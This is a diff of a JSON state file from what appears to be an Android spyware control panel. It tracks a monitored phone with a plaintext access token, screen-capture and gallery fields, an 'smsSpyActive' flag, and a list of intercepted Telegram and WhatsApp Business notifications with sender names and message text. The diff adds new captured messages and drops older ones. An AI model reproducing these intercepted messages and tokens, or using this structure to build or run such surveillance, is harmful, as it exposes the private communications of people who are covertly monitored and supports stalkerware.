@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775639158407,
+    "lastSeen": 1775639161135,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ㅤ ᴀ̈xᴇʟʟ",
+        "content": "Voice message",
+        "time": "08/04 16:06",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775639162389
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ㅤ ᴀ̈xᴇʟʟ",
+        "content": "Voice message",
+        "time": "08/04 16:05",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775639160491
+      },
       {
         "appName": "Telegram",
         "sender": "ㅤ ᴀ̈xᴇʟʟ",
@@ -4302,22 +4318,6 @@
         "time": "08/04 15:15",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775636138154
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎2 pesan dari 2 chat",
-        "time": "08/04 15:04",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775635465095
-      },
-      {
-        "appName": "WA Business",
-        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
-        "content": "~ sfr: Napa",
-        "time": "08/04 15:04",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775635465089
       }
     ],
     "galleryPhotos": [],
